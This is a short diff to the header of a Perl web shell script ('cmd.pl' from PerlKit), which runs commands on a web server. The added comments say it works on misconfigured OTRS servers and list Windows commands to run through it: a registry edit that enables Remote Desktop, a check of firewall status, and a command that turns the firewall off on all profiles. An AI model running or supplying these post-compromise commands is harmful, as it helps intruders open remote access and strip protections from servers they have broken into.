@@ -1,8 +1,13 @@
 #!/usr/bin/perl
 #
-# PerlKit-0.1 - http://www.t0s.org
+# PerlKit thanks for: www.t0s.org
 #
 # cmd.pl: Run commands on a webserver
+# This pl program can run on the OTRS that has misconfigured.
+# Commands can be run:
+# turn on remote desktop:  reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+# check firewall status:  Netsh Advfirewall show allprofiles
+# turn off firewall:  NetSh Advfirewall set allprofiles state off
 
 use strict;
 
